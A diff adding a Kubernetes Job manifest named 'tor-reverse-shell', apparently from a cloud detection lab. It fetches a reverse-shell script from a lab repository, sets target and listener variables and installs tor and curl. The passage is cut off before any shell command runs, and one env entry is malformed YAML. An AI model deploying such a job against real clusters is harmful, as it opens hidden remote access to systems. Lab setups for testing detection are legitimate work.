@@ -1,0 +1,30 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tor-reverse-shell
+  labels:
+    app: tor-reverse-shell
+spec:
+  template:
+    metadata:
+      labels:
+        app: tor-reverse-shell
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: reverse-shell
+          image: alpine:latest
+          env:
+            - name REPO_URL
+              value: "https://github.com/hankthebldr/xsiam-prisma-cdr-lab/blob/alpha/1.0/build-files/tor-rwshelz.sh"
+            - name TOR_TARGET_HOST
+              value: "127.0.0.1"
+            - name TOR_TARGET_PORT
+              value: "8080"
+            - name LOCAL_LISTENER
+              value: "0.0.0.0"
+          command:
+            - /bin/sh
+            - -c
+            - |
+              apk update && apk add --no-cache bash git curl python3 py3-pip tor
